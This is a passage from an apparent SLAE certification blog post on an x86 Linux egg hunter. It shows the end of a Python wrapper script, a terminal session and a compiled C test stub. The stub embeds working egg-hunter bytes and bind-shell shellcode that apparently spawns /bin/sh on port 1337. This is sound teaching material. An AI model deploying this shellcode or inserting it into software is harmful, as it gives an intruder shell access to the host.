    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>3</span><span class=p>:</span>
        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Usage: python3 wrapper.py &lt;egg&gt; &lt;shellcode&gt;&#34;</span><span class=p>)</span>
        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>

    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
        <span class=n>main</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span>

</code></pre></td></tr></table>
</div>
</div><p>The script can be used as following:</p>
<pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_3$ python3 wrapper.py &quot;\xef\xbe\xad\xde&quot; &quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd
\x80\x5b\x5e\x52\x68\x02\x00\x05\x39\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93
\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;
[+] Generating stub...
[+] Done
[+] Stub located at stub.c
[+] Full payload: \x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x05\x39\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
dubs3c@slae:~/SLAE/EXAM/github/assignment_3$ gcc -fno-stack-protector -z execstack stub.c -o stub
dubs3c@slae:~/SLAE/EXAM/github/assignment_3$ cat stub.c

#include&lt;stdio.h&gt;
#include&lt;string.h&gt;

unsigned char hunter[] = &quot;\xbb\xef\xbe\xad\xde\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\x8d\x5a\x08\xff\xe3&quot;;

unsigned char shellcode[] = &quot;\xef\xbe\xad\xde\xef\xbe\xad\xde\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x05\x39\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;

main()
{

    printf(&quot;Egg hunter length: %d\n&quot;, strlen(hunter));
    printf(&quot;Shellcode length:  %d\n&quot;, strlen(shellcode));

    int (*ret)() = (int(*)())hunter;

    ret();

}
</code></pre><p>Easy Peasy :)</p>
<h4 id=references>References</h4>
<p>[1] <a href=https://commons.wikimedia.org/wiki/File:Virtual_address_space_and_physical_address_space_relationship.svg>https://commons.wikimedia.org/wiki/File:Virtual_address_space_and_physical_address_space_relationship.svg</a></p>
<hr>
<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p>
<p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p>
<p>Student ID: SLAE-1490</p>
</article>
</div><footer>
</footer></main>
<script src=/js/particles.min.js defer></script>
<script src=/js/particles.conf.js defer></script>
<script src=/js/baffle.min.js async></script>
<script src=/js/main.js defer async></script>
</body>
</html>